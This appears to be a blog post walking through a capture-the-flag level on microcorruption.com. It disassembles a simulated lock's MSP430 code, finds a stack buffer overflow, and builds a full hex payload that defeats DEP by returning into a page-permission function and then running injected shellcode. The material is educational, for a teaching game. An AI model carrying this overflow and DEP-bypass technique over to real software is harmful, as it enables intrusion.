---
layout: post
title: 'Fun with Assembly 16: '
date: 2015-09-02
status: publish
type: post
published: true
author: Hywel Carver
---
This is the sixteenth in a series. You might want to read the [previous post]({% post_url 2015-09-01-fun-with-assembly-15 %}) before reading this.

This post is based on the Bangalore level on [microcorruption.com](http://microcorruption.com). Like last time, we’re trying to find an input to open a lock without knowing the correct password, using knowledge of assembly language.

# First steps

This level is introduced to us as having memory protection - every page of memory is either writable or executable but never both, normally called [Data Execution Prevention](https://en.wikipedia.org/wiki/Data_Execution_Prevention). The lock manual describes a few relevant interrupts for this: `INT 0x10` turns on DEP, `INT 0x11` takes a page number and a second argument of 1 if the page is writable and 0 if its executable.

Let's look through the code. The main function here calls `set_up_protection` then `login`, and that's all.

### `set_up_protection`

    44de <set_up_protection>
    44de:  0b12           push  r11
    44e0:  0f43           clr   r15
    44e2:  b012 b444      call  #0x44b4 <mark_page_executable>
    44e6:  1b43           mov   #0x1, r11
    44e8:  0f4b           mov   r11, r15
    44ea:  b012 9c44      call  #0x449c <mark_page_writable>
    44ee:  1b53           inc   r11
    44f0:  3b90 4400      cmp   #0x44, r11
    44f4:  f923           jne   #0x44e8 <set_up_protection+0xa>

Mark page 0 as executable, mark pages up to `0x43` = 67 as writable.

    44f6:  0f4b           mov   r11, r15
    44f8:  b012 b444      call  #0x44b4 <mark_page_executable>
    44fc:  1b53           inc   r11
    44fe:  3b90 0001      cmp   #0x100, r11
    4502:  f923           jne   #0x44f6 <set_up_protection+0x18>

Mark pages from `0x44` to `0x100` (68 to 255) as executable.

    4504:  b012 cc44      call  #0x44cc <turn_on_dep>
    4508:  3b41           pop   r11
    450a:  3041           ret
    450c:  3041           ret

Then turn on the protection. The executable areas will be the `0x00xx` addresses and the `0x44xx` addresses onwards. `0x4400` is where the code segment starts. It's not clear why there are two `ret`s here.

### `login`

Luckily, the `login` function is much shorter this time.

    4512 <login>
    4512:  3150 f0ff      add   #0xfff0, sp
    4516:  3f40 0024      mov   #0x2400, r15
    451a:  b012 7a44      call  #0x447a <puts>
    451e:  3f40 2024      mov   #0x2420, r15
    4522:  b012 7a44      call  #0x447a <puts>

Increase the stack by 16 bytes, then write out a couple of strings.

    4526:  3e40 3000      mov   #0x30, r14
    452a:  0f41           mov   sp, r15
    452c:  b012 6244      call  #0x4462 <getsn>

Get 48 bytes of input onto the stack pointer.

    4530:  3f40 6524      mov   #0x2465, r15
    4534:  b012 7a44      call  #0x447a <puts>
    4538:  3150 1000      add   #0x10, sp
    453c:  3041           ret 

Cheekily, this immediately writes out that we had the wrong password. It doesn't even check with the lock! We're going to have to somehow get the code to execute instructions which don't currently exist.

### Developing an exploit.

Normally, the lock is opened by calling `INT` with a value of `0x7f`. Looking back at the `INT` function from a previous level, you can see that this will result in the `sr` register being `0xff00`, then `call #0x10` being executed.

    4904 <INT>
    4904:  0c4f           mov   r15, r12
    4906:  0d12           push  r13
    4908:  0e12           push  r14
    490a:  0c12           push  r12
    490c:  0012           push  pc
    490e:  0212           push  sr
    4910:  0f4c           mov   r12, r15
    4912:  8f10           swpb  r15
    4914:  024f           mov   r15, sr
    4916:  32d0 0080      bis   #0x8000, sr
    491a:  b012 1000      call  #0x10
    491e:  3241           pop   sr
    4920:  3152           add   #0x8, sp
    4922:  3041           ret

It's tempting to think that we could write our own assembly code to do this, put that onto the stack, and then manipulate the return value of the `login` function to return into that code. However, because of the DEP, the stack is writable so it isn't exectuable.

But what if we could make the stack executable once we'd written to it? We could return into the `mark_page_executable` function, and setup the stack so that the page of the stack that we write onto is made executable. To do that, we'd want to return to `0x44ba`, and to have `0x40` and `0x00` next on the stack so that the 40th page is set to executable.

That function finishes by decreasing the size of the stack (so we need 2 bytes of filler) then returning. We can manipulate this return value too (the next two bytes on the stack), so let's set it to be the next byte along on the stack, so that we can write bytecode to be returned to. That's going to be `0x4006`.

At that point we should insert some instructions that call an interrupt with the right parameter. We'll need to move the stack pointer to be in a writeable page, so that the system call doesn't fail. Compiling the instructions:

    add #0xfff0, sp
    mov #0xff00, sr
    call #0x10

we get `3150f0ff324000ffb0121000` as our bytecode.

So in total our exploit is:
 - `0x4142434445464748494a4b4c4d4e4f50` (to fill up the allocated buffer)
 - `0xba44` (to return into the function that will make a page executable)
 - `0x4000` to set page 40 as writable (with the second argument of 0)
 - `0x4141` as 2 bytes of filler
 - `0x0640` so that the next return takes us to execute from `0x4006` on the stack
 - `0x3150f0ff324000ffb0121000`, the bytecode, which will start at address `0x4006`

`0x4142434445464748494a4b4c4d4e4f50ba444000414106403150f0ff324000ffb0121000`

# The door springs open

This was a complicated exploit. Because we could overflow the stack by a long way, we could overwrite a return address on the stack, and add parameters to a system call. That was enough to overcome the DEP. By continuing the pattern of overwriting return adresses, we could return the CPU to start executing on part of the string we inputted.

That part of the string contained the bytecode required to open the lock.